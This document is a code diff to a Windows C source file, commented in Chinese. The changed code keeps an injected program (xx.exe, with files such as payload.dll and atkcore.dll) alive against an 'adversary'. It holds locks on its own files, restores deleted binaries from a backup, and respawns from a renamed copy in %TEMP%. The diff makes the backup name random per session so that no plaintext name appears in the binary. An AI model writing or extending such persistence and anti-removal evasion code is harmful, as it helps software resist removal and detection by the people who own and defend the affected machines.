@@ -229,7 +229,7 @@ static BOOL InitPaths(void) {
 
 /* ================== 我方文件锁 ==================
    Windows 允许删除正在运行的镜像（加载器带 FILE_SHARE_DELETE），所以我们的
-   xx.exe / dll / xxres.bin 默认能被对手直接删掉；文件一旦没了，新的注入就没有
+   xx.exe / dll / 备份文件默认能被对手直接删掉；文件一旦没了，新的注入就没有
    东西可注入，整条复活链会静默失效（实测确认：不持锁时删运行中的 exe 是成功的）。
 
    这里用 access=0 + FILE_SHARE_READ 持住每个文件（实测结论）：
@@ -240,7 +240,7 @@ static BOOL InitPaths(void) {
 static const WCHAR *g_ownFiles[] = {
     L"xx.exe", L"svcguard.dll", L"window.dll", L"atkcore.dll",
     L"payload.dll", L"payload.bin", L"guard.dll", L"defense.dll",
-    L"xxres.bin", NULL
+    NULL   /* 备份文件名每会话随机，运行时由 XXBackupNameW 补 */
 };
 #define OWN_LOCK_MAX 16
 static HANDLE g_ownLocks[OWN_LOCK_MAX];
@@ -269,7 +269,7 @@ static DWORD WINAPI OwnFileShieldThread(LPVOID lp) {
     return 0;
 }
 
-/* xx.exe 被对手删除时，从同目录 xxres.bin 备份还原。
+/* xx.exe 被对手删除时，从同目录的随机备份文件还原。
    两个细节：
      ① 要清只读的是**目标文件本身**（defense 给 xx.exe 置过 FILE_ATTRIBUTE_READONLY，
         不清掉 CopyFileW 覆盖会失败），而且不能拿共享内存指针当路径用 ——
@@ -286,7 +286,12 @@ static void EnsureXxExeExists(void) {
     wcscpy_s(dir, MAX_PATH, g_szXxExePath);
     p = wcsrchr(dir, L'\\');
     if (p) *(p + 1) = L'\0';
-    swprintf_s(bak, MAX_PATH, L"%sxxres.bin", dir);
+    {   /* 随机备份名：r<8hex>.bin，由会话盐派生（二进制无明文） */
+        WCHAR nm[32];
+        XXBackupNameW(g_pSharedView, nm, _countof(nm));
+        swprintf_s(bak, MAX_PATH, L"%s%ls", dir, nm);
+        SecureZeroMemory(nm, sizeof(nm));
+    }
     if (GetFileAttributesW(bak) != INVALID_FILE_ATTRIBUTES) {
         /* 还原目标自己可能被置了只读（或删除待决）：先清成普通文件再覆盖 */
         SetFileAttributesW(g_szXxExePath, FILE_ATTRIBUTE_NORMAL);
@@ -390,7 +395,7 @@ static void RespawnXX(BOOL bForce) {
         return;
     }
 
-    /* 先把交付本体补回来（被对手删了就从 xxres.bin 还原），再决定**拉哪一份**：
+    /* 先把交付本体补回来（被对手删了就从备份还原），再决定**拉哪一份**：
        判据见 xxipc.h 的 XXRespawnTargetPath —— 优先 %TEMP% 下改名的副本
        （对手按名杀 xx.exe），没有再退回交付本体。 */
     EnsureXxExeExists();
@@ -398,7 +403,7 @@ static void RespawnXX(BOOL bForce) {
         WCHAR szTarget[MAX_PATH] = L"";
 
         if (!XXRespawnTargetPath(g_pSharedView, g_szXxExePath, szTarget, MAX_PATH)) {
-            WriteDeamonLog(L"没有可复活的实例（xx.exe 与 xxres.bin 都不可用）: %ls\n", g_szXxExePath);
+            WriteDeamonLog(L"没有可复活的实例（xx.exe 与备份文件都不可用）: %ls\n", g_szXxExePath);
         } else if (IsXxProcessRunning() && !bForce) {
             /* 已有实例在运行就不重复拉起（避免与 defense.dll 看门狗双重复活） */
             WriteDeamonLog(L"xx 已在运行，跳过复活\n");
@@ -1690,6 +1695,8 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
     }
     return TRUE;
 }
+
+
 
 
 
